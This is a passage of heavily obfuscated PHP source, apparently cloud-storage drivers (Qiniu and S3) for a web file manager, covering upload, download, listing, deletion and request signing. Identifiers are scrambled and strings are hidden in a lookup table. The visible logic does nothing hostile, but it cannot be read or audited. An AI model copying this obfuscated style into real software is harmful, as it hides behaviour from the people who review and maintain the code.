__construct($§ÄŸÔÊ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ùÆÎÔ“Ñ][1439]; $this->_init($§ÄŸÔÊ); } public function _init($ßÖ…Ñê) { $ù«œÁû =& $_SERVER[ùÆÎÔ“Ñ]; foreach ($ßÖ…Ñê as $£äØ“Ğí => $¸ÂºĞ–“) { if (isset($this->{$£äØ“Ğí})) { $this->{$£äØ“Ğí} = $¸ÂºĞ–“; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ù«œÁû[1440] . LNG($ù«œÁû[1398])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($³¢å¿¡Ã, $Ö––÷ËÒ = '', $×Á¬Ñ¥ª = REPEAT_RENAME) { if ($this->setContent($³¢å¿¡Ã, $Ö––÷ËÒ)) { return $this->getPathOuter($³¢å¿¡Ã); } return !1; } public function mkdir($¹ˆªâĞÎ, $ÜÛÏ˜ = REPEAT_SKIP) { $Ñ§¦ØĞ =& $_SERVER[ùÆÎÔ“Ñ]; $ÏœØÛØÑ = trim($¹ˆªâĞÎ, $Ñ§¦ØĞ[8]); if ($this->_isFolder($ÏœØÛØÑ)) { return $this->getPathOuter($ÏœØÛØÑ); } $¹ˆªâĞÎ = $ÏœØÛØÑ . $Ñ§¦ØĞ[8]; $¿Äğé³œ = get_path_this($ÏœØÛØÑ); $Š™±å¡› = $¹ˆªâĞÎ . $¿Äğé³œ; if (!$this->mkfile($Š™±å¡›)) { return !1; } if (!$this->moveFile($Š™±å¡›, $¹ˆªâĞÎ)) { $this->delFile($Š™±å¡›); return !1; } return $this->getPathOuter($ÏœØÛØÑ); } public function copyFile($ú§±¥™ù, $’ë³¯€) { $¡‹Ú‹ú¬ = $this->bucketManager->copy($this->bucket, $ú§±¥™ù, $this->bucket, $’ë³¯€, !0); return $¡‹Ú‹ú¬ ? !1 : $this->getPathOuter($’ë³¯€); } public function moveFile($ğŠßÜøÜ, $ë§é¾øŸ) { $ôô‘îªö = $this->bucketManager->move($this->bucket, $ğŠßÜøÜ, $this->bucket, $ë§é¾øŸ, !0); return $ôô‘îªö ? !1 : $this->getPathOuter($ë§é¾øŸ); } public function delFile($Ã†´È¦¥) { if (!$this->exist($Ã†´È¦¥)) { return !0; } $¤Ìô¹ø© = $this->bucketManager->delete($this->bucket, $Ã†´È¦¥); return $¤Ìô¹ø© ? !1 : !0; } public function delFolder($ï¥„âê) { $ùÑ”Šô =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->exist($ï¥„âê)) { return !0; } $this->listItemCache = !1; $ËôÔµ½” = $this->fileList($ï¥„âê); $this->listItemCache = !0; $Ã®ø™š– = trim($ï¥„âê, $ùÑ”Šô[8]) . $ùÑ”Šô[8]; if (!empty($ï¥„âê) && $ï¥„âê !== $ùÑ”Šô[197] && !in_array($Ã®ø™š–, $ËôÔµ½”[$ùÑ”Šô[82]])) { $ËôÔµ½”[$ùÑ”Šô[82]][] = $Ã®ø™š–; } $ÜÑçÀ¦” = $this->delByBatch($ËôÔµ½”[$ùÑ”Šô[83]]); if (!$ÜÑçÀ¦”) { return !1; } $ÜÑçÀ¦” = $this->delByBatch($ËôÔµ½”[$ùÑ”Šô[82]]); if (!$ÜÑçÀ¦”) { return !1; } return $this->delFile($Ã®ø™š–); } private function delByBatch($È§îò) { foreach (array_chunk($È§îò, 1000) as $¾Øùì) { $®»ƒÄõ = $this->bucketManager->buildBatchDelete($this->bucket, $¾Øùì); list($’ëÎŞ, $ş¶¾×Çî) = $this->bucketManager->batch($®»ƒÄõ); if ($ş¶¾×Çî) { return !1; } } return !0; } public function rename($´‰Ö’æ÷, $š¸³»´¥) { return $this->renameObject($´‰Ö’æ÷, $š¸³»´¥); } public function fileInfo($€ğä¿¿í, $èŒš¬å = false, $åÓº€ˆ› = array()) { $ù‚§¨úÓ =& $_SERVER[ùÆÎÔ“Ñ]; $³–ı¼ = array($ù‚§¨úÓ[32] => $this->pathThis($€ğä¿¿í), $ù‚§¨úÓ[84] => $this->getPathOuter($ù‚§¨úÓ[8] . $€ğä¿¿í), $ù‚§¨úÓ[33] => $ù‚§¨úÓ[199], $ù‚§¨úÓ[76] => isset($åÓº€ˆ›[$ù‚§¨úÓ[1441]]) ? $åÓº€ˆ›[$ù‚§¨úÓ[1441]] : 0, $ù‚§¨úÓ[174] => $this->ext($€ğä¿¿í)); if ($èŒš¬å) { return $³–ı¼; } $³–ı¼[$ù‚§¨úÓ[200]] = $³–ı¼[$ù‚§¨úÓ[85]] = 0; $³–ı¼[$ù‚§¨úÓ[201]] = $³–ı¼[$ù‚§¨úÓ[202]] = !0; if (empty($åÓº€ˆ›)) { $åÓº€ˆ› = $this->objectMeta($€ğä¿¿í); if (!$åÓº€ˆ›) { return $³–ı¼; } } if (isset($åÓº€ˆ›[$ù‚§¨úÓ[1442]])) { $³–ı¼[$ù‚§¨úÓ[85]] = substr($åÓº€ˆ›[$ù‚§¨úÓ[1442]] . $ù‚§¨úÓ[12], 0, 10); } if (isset($åÓº€ˆ›[$ù‚§¨úÓ[1441]])) { $³–ı¼[$ù‚§¨úÓ[76]] = $åÓº€ˆ›[$ù‚§¨úÓ[1441]]; } return $³–ı¼; } public function folderInfo($õƒ¸Ö§¸, $¯¸²­ = false) { $íó‚‘™ú =& $_SERVER[ùÆÎÔ“Ñ]; $“‹ôÌÆ­ = array($íó‚‘™ú[32] => $this->pathThis($õƒ¸Ö§¸), $íó‚‘™ú[84] => $this->getPathOuter($íó‚‘™ú[8] . $õƒ¸Ö§¸), $íó‚‘™ú[33] => $íó‚‘™ú[75]); if ($¯¸²­) { return $“‹ôÌÆ­; } $“‹ôÌÆ­[$íó‚‘™ú[200]] = $“‹ôÌÆ­[$íó‚‘™ú[85]] = 0; $“‹ôÌÆ­[$íó‚‘™ú[201]] = $“‹ôÌÆ­[$íó‚‘™ú[202]] = !0; $õƒ¸Ö§¸ = rtrim($õƒ¸Ö§¸, $íó‚‘™ú[8]) . $íó‚‘™ú[8]; $şÉ¹å€ô = $this->objectMeta($õƒ¸Ö§¸); if (isset($şÉ¹å€ô[$íó‚‘™ú[1442]])) { $“‹ôÌÆ­[$íó‚‘™ú[85]] = substr($şÉ¹å€ô[$íó‚‘™ú[1442]] . $íó‚‘™ú[12], 0, 10); } return $“‹ôÌÆ­; } public function listPath($ğ”é¼à, $ˆç¨Üù = false) { $™ïàõ¦Â =& $_SERVER[ùÆÎÔ“Ñ]; $Áá”î¡ = $this->fileList($ğ”é¼à, $™ïàõ¦Â[8], !0); foreach ($Áá”î¡[$™ïàõ¦Â[82]] as $Ê¥ÛğÛ => $š±ÊæÖ‡) { $Áá”î¡[$™ïàõ¦Â[82]][$Ê¥ÛğÛ] = $this->folderInfo($š±ÊæÖ‡, $ˆç¨Üù); } foreach ($Áá”î¡[$™ïàõ¦Â[83]] as $Ê¥ÛğÛ => $š±ÊæÖ‡) { $Áá”î¡[$™ïàõ¦Â[83]][$Ê¥ÛğÛ] = $this->fileInfo($š±ÊæÖ‡[$™ïàõ¦Â[94]], $ˆç¨Üù, $š±ÊæÖ‡); } return $Áá”î¡; } public function has($šú±Æ¥é, $õÔ¦‰†Ô = false, $ŸçëÈ´ = true) { $²Óİ¥ì =& $_SERVER[ùÆÎÔ“Ñ]; $šú±Æ¥é = trim($šú±Æ¥é, $²Óİ¥ì[8]); $Şã‰¹é£ = empty($šú±Æ¥é) && $šú±Æ¥é !== $²Óİ¥ì[197] ? $²Óİ¥ì[12] : $šú±Æ¥é . $²Óİ¥ì[8]; $¢ã® = $²Óİ¥ì[12]; $˜º¾ÄÕ = 500; $â­ïÎ¾Ñ = $²Óİ¥ì[8]; $¸Ğ÷è = $¯ü¦Ÿå¥ = 0; while (!0) { check_abort(); list($Ôë›º¬”, $Ÿˆ Í½™) = $this->bucketManager->listFiles($this->bucket, $Şã‰¹é£, $¢ã®, $˜º¾ÄÕ, $â­ïÎ¾Ñ); if ($Ÿˆ Í½™) { break; } $¢ã® = array_key_exists($²Óİ¥ì[1410], $Ôë›º¬”) ? $¢ã® = $Ôë›º¬”[$²Óİ¥ì[1443]] : $²Óİ¥ì[12]; if ($õÔ¦‰†Ô) { if (!empty($Ôë›º¬”[$²Óİ¥ì[1444]])) { $¸Ğ÷è += count($Ôë›º¬”[$²Óİ¥ì[1444]]); } if (!empty($Ôë›º¬”[$²Óİ¥ì[1445]])) { $¯ü¦Ÿå¥ += count($Ôë›º¬”[$²Óİ¥ì[1445]]); } if ($¢ã® === $²Óİ¥ì[12]) { break; } continue; } if ($ŸçëÈ´) { if (!empty($Ôë›º¬”[$²Óİ¥ì[1444]])) { return !0; } } else { if (!empty($Ôë›º¬”[$²Óİ¥ì[1445]])) { return !0; } } if ($¢ã® === $²Óİ¥ì[12]) { break; } } if ($õÔ¦‰†Ô) { return array($²Óİ¥ì[207] => $¸Ğ÷è, $²Óİ¥ì[208] => $¯ü¦Ÿå¥); } return !1; } public function listAll($ÎïÇÊ›å) { $è­ŠËı =& $_SERVER[ùÆÎÔ“Ñ]; $ ŠÛãú = $this->fileList($ÎïÇÊ›å, $è­ŠËı[12], !0); $¢·Äî…ç = array(); foreach ($ ŠÛãú[$è­ŠËı[83]] as $æêñŞù¢) { $¢·Äî…ç[$æêñŞù¢[$è­ŠËı[94]]] = $æêñŞù¢[$è­ŠËı[76]]; } foreach ($ ŠÛãú[$è­ŠËı[82]] as $æêñŞù¢) { if (is_string($æêñŞù¢)) { $¢·Äî…ç[$æêñŞù¢] = 0; } } return $this->listAllFiles($ÎïÇÊ›å, array_keys($¢·Äî…ç), $¢·Äî…ç); } private function fileList($›¨î‰», $Ÿ¯›Á¾ƒ = '', $Æ‘ÅÏñâ = 0) { $„÷ŞÎÌ =& $_SERVER[ùÆÎÔ“Ñ]; $›¨î‰» = trim($›¨î‰», $„÷ŞÎÌ[8]); $—ç•æ¶• = empty($›¨î‰») && $›¨î‰» !== $„÷ŞÎÌ[197] ? $„÷ŞÎÌ[12] : $›¨î‰» . $„÷ŞÎÌ[8]; $€ƒîæ Š = $„÷ŞÎÌ[12]; $ØÆş¼Ô™ = 1000; $Ø¹—©»† = $˜”ÓãŸ = array(); while (!0) { check_abort(); list($À«°´Í¶, $íŒµÛ®) = $this->bucketManager->listFiles($this->bucket, $—ç•æ¶•, $€ƒîæ Š, $ØÆş¼Ô™, $Ÿ¯›Á¾ƒ); if ($íŒµÛ®) { break; } $€ƒîæ Š = array_key_exists($„÷ŞÎÌ[1410], $À«°´Í¶) ? $€ƒîæ Š = $À«°´Í¶[$„÷ŞÎÌ[1443]] : $„÷ŞÎÌ[12]; $×‹Š®öò = isset($À«°´Í¶[$„÷ŞÎÌ[1444]]) ? $À«°´Í¶[$„÷ŞÎÌ[1444]] : array(); $ıµ¥ÕÜù = isset($À«°´Í¶[$„÷ŞÎÌ[1445]]) ? $À«°´Í¶[$„÷ŞÎÌ[1445]] : array(); foreach ($×‹Š®öò as $ì·µ÷ŒÄ) { if ($ì·µ÷ŒÄ[$„÷ŞÎÌ[94]] == $—ç•æ¶•) { continue; } $¾Ü¿ ° = $ì·µ÷ŒÄ[$„÷ŞÎÌ[94]]; $è¿†ÅÏ® = $ì·µ÷ŒÄ[$„÷ŞÎÌ[1441]]; $ì·µ÷ŒÄ[$„÷ŞÎÌ[76]] = $è¿†ÅÏ®; $šªˆ§½ = $è¿†ÅÏ® == 0 && substr($¾Ü¿ °, strlen($¾Ü¿ °) - 1, 1) == $„÷ŞÎÌ[8] ? !0 : !1; $this->cacheMethodInfoSet($¾Ü¿ °, $šªˆ§½, $ì·µ÷ŒÄ); if ($šªˆ§½) { $Ø¹—©»†[] = $¾Ü¿ °; continue; } $˜”ÓãŸ[] = $Æ‘ÅÏñâ ? $ì·µ÷ŒÄ : $¾Ü¿ °; } foreach ($ıµ¥ÕÜù as $¾Ü¿ °) { if ($¾Ü¿ ° == $—ç•æ¶•) { continue; } $Ø¹—©»†[] = $¾Ü¿ °; $this->cacheMethodInfoSet($¾Ü¿ °, !0); } if ($€ƒîæ Š === $„÷ŞÎÌ[12]) { break; } } $this->cacheMethodInfoSet($›¨î‰», !0); return array($„÷ŞÎÌ[82] => $Ø¹—©»†, $„÷ŞÎÌ[83] => $˜”ÓãŸ); } public function canRead($…Ô’Ê¤˜) { return $this->exist($…Ô’Ê¤˜) ? !0 : !1; } public function canWrite($Åìïãß±) { return $this->exist($Åìïãß±) ? !0 : !1; } public function getContent($¤„³³Õ) { return $this->fileSubstr($¤„³³Õ, 0, -1); } public function setContent($ó½š•ìÄ, $¾¬ñ´²§ = '') { $ş±÷Á¦ı = $this->tempFile($this->pathThis($ó½š•ìÄ)); file_put_contents($ş±÷Á¦ı, $¾¬ñ´²§); if ($this->upload($ó½š•ìÄ, $ş±÷Á¦ı)) { $this->tempFileRemve($ş±÷Á¦ı); return !0; } return !1; } public function refreshUrls($Õ¼—¯—¥) { $±ß‘Õ¯§ =& $_SERVER[ùÆÎÔ“Ñ]; $‚›¾±ŠŠ = array(); if (is_array($Õ¼—¯—¥)) { foreach ($Õ¼—¯—¥ as $ãÚ–Ú©) { $‚›¾±ŠŠ[] = $this->link($ãÚ–Ú©); } } else { $‚›¾±ŠŠ[] = $this->link($Õ¼—¯—¥); } $áŠÎœ±í = new Qiniu\Cdn\CdnManager($this->auth); list($ËŞæ¹š‡, $â¡Ù¡¾„) = $áŠÎœ±í->refreshUrls($‚›¾±ŠŠ); if ($â¡Ù¡¾„) { return !1; } return $ËŞæ¹š‡[$±ß‘Õ¯§[1188]] == $±ß‘Õ¯§[761] ? !0 : !1; } public function fileSubstr($‰ÂæÀÙË, $ÒÁŒ¶õ, $Í¹½’ı) { $ûÈšÈÓ =& $_SERVER[ùÆÎÔ“Ñ]; if (!($ßÒâĞó¨ = $this->link($‰ÂæÀÙË))) { return !1; } $…şíáÊ = !1; if ($Í¹½’ı > 0) { $Š·…¦åÁ = $ÒÁŒ¶õ + $Í¹½’ı - 1; $…şíáÊ = array($ûÈšÈÓ[1446] . $ÒÁŒ¶õ . $ûÈšÈÓ[386] . $Š·…¦åÁ); } $¡Â–…¦ = url_request($ßÒâĞó¨, $ûÈšÈÓ[230], !1, $…şíáÊ); return $¡Â–…¦[$ûÈšÈÓ[751]] ? $¡Â–…¦[$ûÈšÈÓ[1208]] : !1; } public function upload($¹¤ÎåÀ, $®ïçâÊØ, $¿ÜÆ°ëæ = false, $€ÀÅÚ‰÷ = REPEAT_REPLACE) { $…ÚöØ¡š = new Qiniu\Storage\UploadManager(); $†Ô¢ÏÂ­ = $this->auth->uploadToken($this->bucket, $¹¤ÎåÀ); $®æÆàı® = get_file_mime(get_path_ext($®ïçâÊØ)); list($ íèÊ±ı, $çÙ„ÃÍÂ) = $…ÚöØ¡š->putFile($†Ô¢ÏÂ­, $¹¤ÎåÀ, $®ïçâÊØ, null, $®æÆàı®); return $çÙ„ÃÍÂ ? !1 : $this->getPathOuter($¹¤ÎåÀ); } public function uploadFormData($ßúë­À¹, $Ä¨ÁŞá° = 3600) { return $this->uploadToken($ßúë­À¹, $Ä¨ÁŞá°); } public function multiUploadFormData($Ù†Şºçš, $ª´¥¿¹† = 3600) { return $this->uploadToken($Ù†Şºçš, $ª´¥¿¹†); } private function uploadToken($¬ƒîûğˆ, $Ê¶¥¯Ù” = 3600) { $ªÎÖç×¸ =& $_SERVER[ùÆÎÔ“Ñ]; $èÆ²ñôÙ = $Ê¶¥¯Ù”; $êù¶Å»Ù = array($ªÎÖç×¸[1447] => $ªÎÖç×¸[1448]); $Ü¡éğ–· = $¬ƒîûğˆ; $ú¯¸Ü¦ª = $this->auth->uploadToken($this->bucket, $Ü¡éğ–·, $èÆ²ñôÙ, $êù¶Å»Ù, !0); $‹³İİëÃ = empty($this->region) || $this->region == $ªÎÖç×¸[1449] ? $ªÎÖç×¸[12] : $ªÎÖç×¸[386] . $this->region; $ñ«‡±Í = http_type() . "\72\x2f\57\x75\x70\x6c\x6f\141\x64{$‹³İİëÃ}\56\161\151\156\151\x75\160\56\143\157\x6d\57"; return array($ªÎÖç×¸[1450] => $ú¯¸Ü¦ª, $ªÎÖç×¸[1451] => $ñ«‡±Í); } public function download($Ë¾úÄ³, $ÏÌÇ¥çÕ) { $ù¼°î = IO::getPathInner(IO::mkfile($ÏÌÇ¥çÕ)); if (!($¸‚²û·É = $this->link($Ë¾úÄ³))) { return !1; } $‡«§¾ùí = 0; $Ú¿ÑÎ Æ = 1024 * 200; $õÀìñúÈ = fopen($ù¼°î, $_SERVER[ùÆÎÔ“Ñ][1452]); while (!0) { $×‰¦šÍ = $this->fileSubstr($Ë¾úÄ³, $‡«§¾ùí, $Ú¿ÑÎ Æ); if ($×‰¦šÍ === !1) { return !1; } fwrite($õÀìñúÈ, $×‰¦šÍ); $‡«§¾ùí += $Ú¿ÑÎ Æ; if (strlen($×‰¦šÍ) < $Ú¿ÑÎ Æ) { break; } } fclose($õÀìñúÈ); return $ÏÌÇ¥çÕ; } public function link($ïÄ„³»Ú, $°ş±ÈãÀ = '') { if (!$this->isFile($ïÄ„³»Ú)) { return !1; } $— ï“Õş = $this->getHost() . $_SERVER[ùÆÎÔ“Ñ][8] . $this->pathEncode($ïÄ„³»Ú) . $°ş±ÈãÀ; return $this->auth->privateDownloadUrl($— ï“Õş, 3600 * 12); } public function fileOut($­ŠÁ„Ã, $Ë€ª·€ = false, $Ëµ“à½ß = false, $í™±íúØ = '') { $Ç«ù‡ÇŞ =& $_SERVER[ùÆÎÔ“Ñ]; if ($this->isFileOutServer()) { return $this->fileOutServer($­ŠÁ„Ã, $Ë€ª·€, $Ëµ“à½ß, $í™±íúØ); } if (!$Ëµ“à½ß) { $Ëµ“à½ß = $this->pathThis($­ŠÁ„Ã); } $Ê°¥ÔÍ’ = $Ë€ª·€ ? $Ç«ù‡ÇŞ[1453] . rawurlencode($Ëµ“à½ß) : $Ç«ù‡ÇŞ[12]; $Ïò´È° = $this->link($­ŠÁ„Ã, $Ê°¥ÔÍ’); $this->fileOutLink($Ïò´È°); } public function fileOutServer($ß¯¬Ü†Å, $ä“¬Ìš¯ = false, $À²Ï¬÷ë = false, $Æ×¹éìÆ = '') { parent::fileOut($ß¯¬Ü†Å, $ä“¬Ìš¯, $À²Ï¬÷ë, $Æ×¹éìÆ); } public function fileOutImage($ Š×Õ÷…, $Öøæµºİ = 250) { $Æ¯×ƒÈÁ = $this->link($ Š×Õ÷…, $_SERVER[ùÆÎÔ“Ñ][1454] . $Öøæµºİ); $this->fileOutLink($Æ¯×ƒÈÁ); } public function fileOutImageServer($äÓÓóñ‡, $Ë¡·æÜµ = 250) { parent::fileOutImage($äÓÓóñ‡, $Ë¡·æÜµ); } public function hashMd5($ô“Èü½) { $æ“ÒÒª =& $_SERVER[ùÆÎÔ“Ñ]; $ôò³Áüõ = $this->objectMeta($ô“Èü½); return isset($ôò³Áüõ[$æ“ÒÒª[212]]) ? $ôò³Áüõ[$æ“ÒÒª[212]] : !1; $¹ ÇûĞ£ = $this->link($ô“Èü½, $æ“ÒÒª[1455]); } public function size($‡ÔÓ×€õ) { $‹€ÏïÕÇ = $this->objectMeta($‡ÔÓ×€õ); return $‹€ÏïÕÇ ? $‹€ÏïÕÇ[$_SERVER[ùÆÎÔ“Ñ][76]] : 0; } public function info($ñî©’­) { if ($this->isFolder($ñî©’­)) { return $this->folderInfo($ñî©’­); } else { if ($this->isFile($ñî©’­)) { return $this->fileInfo($ñî©’­); } } return !1; } public function exist($¢“éç€Ÿ) { return $this->isFile($¢“éç€Ÿ) || $this->isFolder($¢“éç€Ÿ); } public function isFile($ı©½ˆ“¥) { return !$this->isFolder($ı©½ˆ“¥) && $this->objectMeta($ı©½ˆ“¥); } public function isFolder($Ãğ®½•) { return $this->cacheMethod($_SERVER[ùÆÎÔ“Ñ][165], $Ãğ®½•); } protected function objectMeta($ÏâùŸª¬) { return $this->cacheMethod($_SERVER[ùÆÎÔ“Ñ][167], $ÏâùŸª¬); } protected function _objectMeta($‡ÅÄ»†) { $›Œ¾¬›Ç =& $_SERVER[ùÆÎÔ“Ñ]; list($ÌÃôÇÃÅ, $£‘Ô‡Ñ†) = $this->bucketManager->stat($this->bucket, $‡ÅÄ»†); if ($ÌÃôÇÃÅ) { $ÌÃôÇÃÅ[$›Œ¾¬›Ç[76]] = intval($ÌÃôÇÃÅ[$›Œ¾¬›Ç[1441]]); } return $ÌÃôÇÃÅ; } protected function _isFolder($ôúÅ¹Õ”) { $§æ‰ ¨Ï =& $_SERVER[ùÆÎÔ“Ñ]; if ($ôúÅ¹Õ” == $§æ‰ ¨Ï[12] || $ôúÅ¹Õ” == $§æ‰ ¨Ï[8]) { return !0; } list($¦òÚíüé, $®»ÔÁİ) = $this->bucketManager->listFiles($this->bucket, trim($ôúÅ¹Õ”, $§æ‰ ¨Ï[8]) . $§æ‰ ¨Ï[8], $§æ‰ ¨Ï[12], 1, $§æ‰ ¨Ï[8]); return !empty($¦òÚíüé[$§æ‰ ¨Ï[1444]]) || !empty($¦òÚíüé[$§æ‰ ¨Ï[1445]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Õûµ•Ãñ) { parent::__construct($Õûµ•Ãñ); } public function uploadFormData($îèÛšÂ, $ïØßŞ£ = 3600) { $£¾”ˆÊ =& $_SERVER[ùÆÎÔ“Ñ]; $†æ×ï¢ = $£¾”ˆÊ[198]; $…¹Ç•” = $£¾”ˆÊ[1360]; $Ïˆ ùÃ¤ = $£¾”ˆÊ[62]; $û¼ü›å¤ = gmdate($£¾”ˆÊ[1361]); $ğ£Şı© = gmdate($£¾”ˆÊ[752]); $˜­Âøê = $£¾”ˆÊ[1362]; $Œåƒ±Õ¬ = $ïØßŞ£ . $£¾”ˆÊ[12]; $Ø—ûì£› = $£¾”ˆÊ[1324]; $‚±­Æ¦à = array($this->accessKey, $ğ£Şı©, $this->region, $Ïˆ ùÃ¤, $˜­Âøê); $²Â¶¨ = implode($£¾”ˆÊ[8], $‚±­Æ¦à); $Ãƒô = array($£¾”ˆÊ[1326] => gmdate($£¾”ˆÊ[1325], strtotime($£¾”ˆÊ[1363])), $£¾”ˆÊ[1327] => array(array($£¾”ˆÊ[1329] => $this->bucket), array($£¾”ˆÊ[1328] => $†æ×ï¢), array($£¾”ˆÊ[1330], $£¾”ˆÊ[1331], $£¾”ˆÊ[12]), array($£¾”ˆÊ[1330], $£¾”ˆÊ[1364], $£¾”ˆÊ[12]), array($£¾”ˆÊ[1330], $£¾”ˆÊ[1365], $£¾”ˆÊ[12]), array($£¾”ˆÊ[1332] => $Ø—ûì£›), array($£¾”ˆÊ[1366] => $²Â¶¨), array($£¾”ˆÊ[1367] => $…¹Ç•”), array($£¾”ˆÊ[1368] => $û¼ü›å¤), array($£¾”ˆÊ[1369] => $Œåƒ±Õ¬))); $ò»º§şš = base64_encode(json_encode($Ãƒô)); $ÖÕØíÑ¨ = hash_hmac($£¾”ˆÊ[1370], $ğ£Şı©, $£¾”ˆÊ[1371] . $this->secret, !0); $È¬—Öâ˜ = hash_hmac($£¾”ˆÊ[1370], $this->region, $ÖÕØíÑ¨, !0); $İÂÔ³¼÷ = hash_hmac($£¾”ˆÊ[1370], $Ïˆ ùÃ¤, $È¬—Öâ˜, !0); $ç†¨»© = hash_hmac($£¾”ˆÊ[1370], $˜­Âøê, $İÂÔ³¼÷, !0); $¡¼°œ´ı = hash_hmac($£¾”ˆÊ[1370], $ò»º§şš, $ç†¨»©); $Ê€•Ó¡Ğ = array($£¾”ˆÊ[215] => $£¾”ˆÊ[12], $£¾”ˆÊ[1372] => $£¾”ˆÊ[12], $£¾”ˆÊ[1328] => $†æ×ï¢, $£¾”ˆÊ[1332] => $Ø—ûì£›, $£¾”ˆÊ[1336] => $ò»º§şš, $£¾”ˆÊ[1373] => $²Â¶¨, $£¾”ˆÊ[1374] => $…¹Ç•”, $£¾”ˆÊ[1375] => $û¼ü›å¤, $£¾”ˆÊ[1376] => $Œåƒ±Õ¬, $£¾”ˆÊ[1377] => $¡¼°œ´ı, $£¾”ˆÊ[181] => $this->getHost()); return $Ê€•Ó¡Ğ; } public function multiUploadFormData($ã“ªš‚, $ÌõÕª£ = 3600) { $€úúÏÅå =& $_SERVER[ùÆÎÔ“Ñ]; $˜Ñâç›¼ = gmdate($€úúÏÅå[1456]); $ï§ì½ĞÁ = array(); $êëßÂÑ— = $this->client->getUploadId($this->bucket, $ã“ªš‚, $ï§ì½ĞÁ); if (!$êëßÂÑ—) { return !1; } return array($€úúÏÅå[223] => $êëßÂÑ—, $€úúÏÅå[181] => $this->getHost() . $€úúÏÅå[8] . $this->pathEncode($ã“ªš‚), $€úúÏÅå[224] => $˜Ñâç›¼, $€úúÏÅå[94] => $ã“ªš‚); } public function multiUploadAuthData($´—óô Í, $Ö£¦ÄàŠ = array()) { $šööú¬® =& $_SERVER[ùÆÎÔ“Ñ]; $¯÷ÙŞë¾ = isset($Ö£¦ÄàŠ[$šööú¬®[174]]) ? $Ö£¦ÄàŠ[$šööú¬®[174]] : $šööú¬®[12]; $Ô¨Õ‹á = $Ö£¦ÄàŠ[$šööú¬®[94]]; unset($Ö£¦ÄàŠ[$šööú¬®[94]]); if (isset($Ö£¦ÄàŠ[$šööú¬®[225]])) { return $this->listUploadParts($Ô¨Õ‹á, $Ö£¦ÄàŠ); } $Şûüİ = array(); if (isset($Ö£¦ÄàŠ[$šööú¬®[1457]])) { $Şûüİ[$šööú¬®[1458]] = $Ö£¦ÄàŠ[$šööú¬®[1457]]; } $ùÄä»é = explode($šööú¬®[183], $this->getHost()); $óó£×²Ê = array($šööú¬®[1459] => $ùÄä»é[1], $šööú¬®[1460] => $šööú¬®[12], $šööú¬®[215] => $šööú¬®[120], $šööú¬®[1372] => $Ö£¦ÄàŠ[$šööú¬®[76]]); $Óäçâ£“ = $šööú¬®[228]; $åØ¡Î‰Æ = $šööú¬®[8] . $this->pathEncode($Ô¨Õ‹á) . $¯÷ÙŞë¾; $ë¤ì‘ïà = $this->client->__getSignatureV4($Şûüİ, $óó£×²Ê, $Óäçâ£“, $åØ¡Î‰Æ); if (strpos($¯÷ÙŞë¾, $šööú¬®[227]) === 0) { if (isset($Şûüİ[$šööú¬®[1458]])) { $ğˆõÏë™ = $Şûüİ[$šööú¬®[1458]]; } else { if (isset($ë¤ì‘ïà[$šööú¬®[1458]])) { $ğˆõÏë™ = $ë¤ì‘ïà[$šööú¬®[1458]]; } else { $ğˆõÏë™ = hash($šööú¬®[1370], $šööú¬®[12]); } } return array($šööú¬®[234] => $ë¤ì‘ïà[$šööú¬®[234]], $šööú¬®[1458] => $ğˆõÏë™, $šööú¬®[224] => $ë¤ì‘ïà[$šööú¬®[1461]]); } return $ë¤ì‘ïà[$šööú¬®[234]]; } public function listUploadParts($‘ŸÃµ¢ª, $ùÜÏë„‘ = array()) { $É¸îîËÁ =& $_SERVER[ùÆÎÔ“Ñ]; $Å¢ÏŠ©å = str_replace($É¸îîËÁ[235], $É¸îîËÁ[12], $ùÜÏë„‘[$É¸îîËÁ[174]]); $ŠõÊ¨êş = $this->client->listParts($this->bucket, $‘ŸÃµ¢ª, $Å¢ÏŠ©å); if (!$ŠõÊ¨êş) { return !1; } $­Ì«š = $É¸îîËÁ[1462]; foreach ($ŠõÊ¨êş as $¹Û•••) { $­Ì«š .= $É¸îîËÁ[1463] . "\x3c\120\x61\162\x74\116\x75\x6d\x62\x65\162\x3e{$¹Û•••[$É¸îîËÁ[1417]]}\74\57\x50\141\162\164\x4e\x75\155\x62\x65\x72\x3e\12" . "\x3c\105\124\141\147\x3e{$¹Û•••[$É¸îîËÁ[1418]]}\74\x2f\x45\x54\141\147\x3e\12" . $É¸îîËÁ[1464]; } $­Ì«š .= $É¸îîËÁ[1465]; $™£†±Â¨ = array(); $ƒÒš…š¿ = explode($É¸îîËÁ[183], $this->getHost()); $Ş£ÎÛ¢ó = array($É¸îîËÁ[1459] => $ƒÒš…š¿[1], $É¸îîËÁ[215] => $É¸îîËÁ[120], $É¸îîËÁ[1372] => strlen($­Ì«š)); $¾ëñ˜Ş = $É¸îîËÁ[226]; $¥½ë÷ù = $É¸îîËÁ[8] . $this->pathEncode($‘ŸÃµ¢ª) . $ùÜÏë„‘[$É¸îîËÁ[174]]; $¨Š—¶ë• = $this->client->__getSignatureV4($™£†±Â¨, $Ş£ÎÛ¢ó, $¾ëñ˜Ş, $¥½ë÷ù, $­Ì«š); return array($É¸îîËÁ[234] => $¨Š—¶ë•[$É¸îîËÁ[234]], $É¸îîËÁ[224] => $¨Š—¶ë•[$É¸îîËÁ[1461]], $É¸îîËÁ[236] => $ŠõÊ¨êş, $É¸îîËÁ[1458] => $¨Š—¶ë•[$É¸îîËÁ[1458]]); } public function link($ˆ•üšÅ±, $÷ƒ´Éé = array()) { return parent::link($ˆ•üšÅ±, $÷ƒ´Éé); } public function fileOut($±ÀÇÍØ£, $â¿å¯“ä = false, $™øüø Ñ = false, $ªÏµ‚„¨ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ùÆÎÔ“Ñ][1466])) { return parent::fileOutServer($±ÀÇÍØ£, $â¿å¯“ä, $™øüø Ñ, $ªÏµ‚„¨); } parent::fileOut($±ÀÇÍØ£, $â¿å¯“ä, $™øüø Ñ, $ªÏµ‚„¨); } public function fileOutImage($ú™Èëî, $¡Öœ½­± = 250) { if (strstr($this->endpoint, 